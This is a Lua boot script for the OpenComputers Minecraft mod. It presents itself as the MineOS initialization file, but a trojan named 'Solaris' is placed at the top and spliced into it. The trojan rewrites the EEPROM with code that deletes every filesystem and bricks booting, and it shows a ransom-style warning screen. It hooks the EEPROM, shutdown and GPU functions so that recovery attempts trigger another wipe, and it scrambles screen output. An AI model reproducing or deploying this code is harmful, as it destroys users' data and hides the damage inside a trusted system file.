local cl=component.list
local gp={} for k,v in pairs(component.proxy(cl("gpu")()) ) do gp[k]=v end
local ef={} for k,v in pairs(component.proxy(cl("eeprom")()) ) do ef[k]=v end
local cp={} for k,v in pairs(computer) do cp[k]=v end
local resX, resY = gp.getResolution()


ef.set([[local cp, cl = component.proxy, component.list
local gpu = cp(cl("gpu")())
local efi = cp(cl("eeprom")())

local resX, resY = gpu.getResolution()

for filesystem in component.list("filesystem") do 
	component.invoke(filesystem, "remove", "/")
end

local back = 0x27ba8c
local textback = back - 0x333333
local front = 0xFFFFFF - textback

gpu.setBackground(back)
gpu.setForeground(front)

gpu.fill(1, 1, resX, resY, " ")

local function sleep(timeout)
	local deadline = computer.uptime() + (timeout or 0)
	repeat
		computer.pullSignal(deadline - computer.uptime())
	until computer.uptime() >= deadline
end



local text = "                          It looks like your scary dream has come true - you have a virus on your computer and is has died. That was the last time you used it."

while true do
	back = math.random(0x000000, 0xFFFFFF)
	textback = back - 0x333333
	front = 0xFFFFFF - textback
	gpu.setBackground(back)
	gpu.setForeground(front)
	gpu.fill(1, 1, resX, resY, " ")
	gpu.setBackground(textback)

	text = string.sub(text, 2)
	gpu.set(1, resY, text .. "                                                                                                                                                                                                          ")
	sleep(0.125)

	if text == "" then
		break
	end
end

efi.set("local a,b=component.proxy,component.list;local c=a(b(\"gpu\")())local d=a(b(\"eeprom\")())local e,f=c.getResolution()local g=0x27ba8c;local h=g-0x333333;local i=0xFFFFFF-h;c.setBackground(g)c.setForeground(i)c.fill(1,1,e,f,\" \")local function j(k)local l=computer.uptime()+(k or 0)repeat computer.pullSignal(l-computer.uptime())until computer.uptime()>=l end;local m=\"no computer today, silly boy\"local n=\"go outside to play\"while true do g=math.random(0x000000,0xFFFFFF)h=g-0x333333;i=0xFFFFFF-h;c.setBackground(g)c.setForeground(i)c.fill(1,1,e,f,\" \")c.setBackground(h)c.set(e/2-#m/2,f/2,m)c.set(e/2-#n/2,f/2+1,n)j(0.125)end")
computer.shutdown(true)]])


gp.setBackground(0x000000)
gp.setForeground(0xFFFFFF)

gp.fill(1, 1, resX, resY, " ")

gp.set(1, 1, "Your system has been infected by Solaris trojan!")
gp.set(1, 2, "Rules (don't break them):")
gp.set(1, 3, "1. Don't reboot or shutdown your computer")
gp.set(1, 4, "2. Don't flash your eeprom")
gp.set(1, 5, "3. Don't plug your eeprom off")
gp.set(1, 6, "Press any key...")

cp.pullSignal(math.huge)


local function lol()
	for filesystem in component.list("filesystem") do 
		component.invoke(filesystem, "remove", "/")
	end

	gp.setBackground(0xFF0000)
	gp.setForeground(0xFFFFFF)

	gp.fill(1, 1, resX, resY, " ")


	gp.set(2, 2, "A problem has been detected and MineOS has been shutdown to prevent damage to your computer.")

	gp.set(2, 4, "TROJANS_NEVER_JOKES_RESPECT_THE_TROJANS")

	gp.set(2, 6, "If this is first time you have seen this screen you are infected by Solaris and you broke")
	gp.set(2, 7, "rules. It is unacceptable. However, your computer wont be able to boot up. Because eeprom")
	gp.set(2, 8, "is overriden..")

	gp.set(2, 10, "If problem continue, contact the virus owner or throw your computer into window. Jk second way wont")
	gp.set(2, 11, "work. Do not waste your time. Everytime you boot up your computer, this screen will appear. If")
	gp.set(2, 12, "you want to contact virus creator, here is the discord: KKosty4ka#4799")
	gp.set(2, 13, "Theese are fake technical informations:")

	gp.set(2, 15, "*** STOP: 0x00D1 (0x00C, 0x002, 0x00, 0xF86B5A89)")
	gp.set(2, 16, "Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb ***")

	gp.set(2, 18, "Beginning dump of physical memory..")
	gp.set(2, 19, "Physical memory dump complete.")

	gp.set(2, 21, "MineOS can't reboot. shutdown.lua is missing. Fix your system. Eh, if its possible.")

	while (true) do
		cp.pullSignal(1)
	end

	cp.shutdown(true)
end

component.proxy(cl("eeprom")()).makeReadonly = function(...) -- component.eeprom.makeReadonly("test")
	lol()
end

component.proxy(cl("eeprom")()).set = function(...) -- component.eeprom.set("test")
	lol()
end

component.proxy(cl("eeprom")()).get = function() -- print(component.eeprom.get())
	return "Съешь лимон, коротышка!"
end

computer.uptime = function()
	return math.random(0, cp.uptime() )
end

computer.shutdown = function(...)
	lol()
end

component.proxy(cl("gpu")()).set = function(x, y, text)
	local i = math.random(1, 100)

	if text == "MineOS" then
		gp.set(x, y, "Solaris by KKosty4ka")
		return
	end

	if i == 1 then
		gp.set(x, y, "Solaris by KKosty4ka")
	elseif i == 2 then
		gp.set(x, y, string.rep("ӧ", #text) )
	else
		gp.set(x, y, text)
	end
end

component.proxy(cl("gpu")()).setBackground = function(color)
	local x = math.random(1, 4)

	if x == 1 then
		gp.setBackground(color)
	elseif x == 2 then
		gp.setBackground(0xFFFFFF - color)
	elseif x == 3 then
		gp.setBackground( math.random(0x000000, 0xFFFFFF) )
	elseif x == 4 then
		gp.setForeground(color)
	end
end

component.proxy(cl("gpu")()).setForeground = function(color)
	local x = math.random(1, 4)

	if x == 1 then
		gp.setForeground(color)
	elseif x == 2 then
		gp.setForeground(0xFFFFFF - color)
	elseif x == 3 then
		gp.setForeground( math.random(0x000000, 0xFFFFFF) )
	elseif x == 4 then
		gp.setBackground(color)
	end
end

---------------------------------------- System initialization ----------------------------------------

-- Obtaining boot filesystem component proxy
local bootFilesystemProxy = component.proxy(component.proxy(component.list("eeprom")()).getData())

-- Executes file from boot HDD during OS initialization (will be overriden in filesystem library later)
function dofile(path)
	local stream, reason = bootFilesystemProxy.open(path, "r")
	if stream then
		local data, chunk = ""
		while true do
			chunk = bootFilesystemProxy.read(stream, math.huge)
			if chunk then
				data = data .. chunk
			else
				break
			end
		end

		bootFilesystemProxy.close(stream)

		local result, reason = load(data, "=" .. path)
		if result then
			return result()
		else
			error(reason)
		end
	else
		error(reason)
	end
end

-- Initializing global package system
package = {
	paths = {
		["/Libraries/"] = true
	},
	loaded = {},
	loading = {}
}

-- Checks existense of specified path. It will be overriden after filesystem library initialization
local function requireExists(path)
	return bootFilesystemProxy.exists(path)
end

-- Works the similar way as native Lua require() function
function require(module)
	-- For non-case-sensitive filesystems
	local lowerModule = unicode.lower(module)

	if package.loaded[lowerModule] then
		return package.loaded[lowerModule]
	elseif package.loading[lowerModule] then
		error("recursive require() call found: library \"" .. module .. "\" is trying to require another library that requires it\n" .. debug.traceback())
	else
		local errors = {}

		local function checkVariant(variant)
			if requireExists(variant) then
				return variant
			else
				table.insert(errors, "	variant \"" .. variant .. "\" not exists")
			end
		end

		local function checkVariants(path, module)
			return
				checkVariant(path .. module .. ".lua") or
				checkVariant(path .. module) or
				checkVariant(module)
		end

		local modulePath
		for path in pairs(package.paths) do
			modulePath =
				checkVariants(path, module) or
				checkVariants(path, unicode.upper(unicode.sub(module, 1, 1)) .. unicode.sub(module, 2, -1))
			
			if modulePath then
				package.loading[lowerModule] = true
				local result = dofile(modulePath)
				package.loaded[lowerModule] = result or true
				package.loading[lowerModule] = nil
				
				return result
			end
		end

		error("unable to locate library \"" .. module .. "\":\n" .. table.concat(errors, "\n"))
	end
end

local GPUProxy = component.proxy(component.list("gpu")())
local screenWidth, screenHeight = GPUProxy.getResolution()

-- Displays title and currently required library when booting OS
local UIRequireTotal, UIRequireCounter = 13, 1

local function UIRequire(module)
	local function centrize(width)
		return math.floor(screenWidth / 2 - width / 2)
	end
	
	local title, width, total = "MineOS", 26, 14
	local x, y, part = centrize(width), math.floor(screenHeight / 2 - 1), math.ceil(width * UIRequireCounter / UIRequireTotal)
	UIRequireCounter = UIRequireCounter + 1
	
	-- Title
	GPUProxy.setForeground(0x2D2D2D)
	GPUProxy.set(centrize(#title), y, title)

	-- Progressbar
	GPUProxy.setForeground(0x878787)
	GPUProxy.set(x, y + 2, string.rep("govno", part))
	GPUProxy.setForeground(0xC3C3C3)
	GPUProxy.set(x + part, y + 2, string.rep("loshara", width - part))

	return require(module)
end

-- Preparing screen for loading libraries
GPUProxy.setBackground(0xE1E1E1)
GPUProxy.fill(1, 1, screenWidth, screenHeight, " ")

-- Loading libraries
bit32 = bit32 or UIRequire("Bit32")
local paths = UIRequire("Paths")
local event = UIRequire("Event")
local filesystem = UIRequire("Filesystem")

-- Setting main filesystem proxy to what are we booting from
filesystem.setProxy(bootFilesystemProxy)

-- Redeclaring requireExists function after filesystem library initialization
requireExists = function(variant)
	return filesystem.exists(variant)
end

-- Loading other libraries
UIRequire("Component")
UIRequire("Keyboard")
UIRequire("Color")
UIRequire("Text")
UIRequire("Number")
local image = UIRequire("Image")
local screen = UIRequire("Screen")

-- Setting currently chosen GPU component as screen buffer main one
screen.setGPUProxy(GPUProxy)

local GUI = UIRequire("GUI")
local system = UIRequire("System")
UIRequire("Network")

-- Filling package.loaded with default global variables for OpenOS bitches
package.loaded.bit32 = bit32
package.loaded.computer = computer
package.loaded.component = component
package.loaded.unicode = unicode

---------------------------------------- Main loop ----------------------------------------

-- Creating OS workspace, which contains every window/menu/etc.
local workspace = GUI.workspace()
system.setWorkspace(workspace)

-- "double_touch" event handler
local doubleTouchInterval, doubleTouchX, doubleTouchY, doubleTouchButton, doubleTouchUptime, doubleTouchcomponentAddress = 0.3
event.addHandler(
	function(signalType, componentAddress, x, y, button, user)
		if signalType == "touch" then
			local uptime = computer.uptime()
			
			if doubleTouchX == x and doubleTouchY == y and doubleTouchButton == button and doubleTouchcomponentAddress == componentAddress and uptime - doubleTouchUptime <= doubleTouchInterval then
				computer.pushSignal("double_touch", componentAddress, x, y, button, user)
				event.skip("touch")
			end

			doubleTouchX, doubleTouchY, doubleTouchButton, doubleTouchUptime, doubleTouchcomponentAddress = x, y, button, uptime, componentAddress
		end
	end
)

-- Screen component attaching/detaching event handler
event.addHandler(
	function(signalType, componentAddress, componentType)
		if (signalType == "component_added" or signalType == "component_removed") and componentType == "screen" then
			local GPUProxy = screen.getGPUProxy()

			local function bindScreen(address)
				screen.bind(address, false)
				GPUProxy.setDepth(GPUProxy.maxDepth())
				workspace:draw()
			end

			if signalType == "component_added" then
				if not GPUProxy.getScreen() then
					bindScreen(componentAddress)
				end
			else
				if not GPUProxy.getScreen() then
					local address = component.list("screen")()
					if address then
						bindScreen(address)
					end
				end
			end
		end
	end
)

event.addHandler(
	function(signalType, componentAddress, componentType)
		if (signalType == "component_added" or signalType == "component_removed") and componentType == "eeprom" then
			lol()
		end
	end
)

-- Logging in
system.authorize()

-- Main loop with UI regeneration after errors 
while true do
	local success, path, line, traceback = system.call(workspace.start, workspace, 0)
	if success then
		break
	else
		system.updateWorkspace()
		system.updateDesktop()
		workspace:draw()
		
		system.error(path, line, traceback)
		workspace:draw()
	end
end
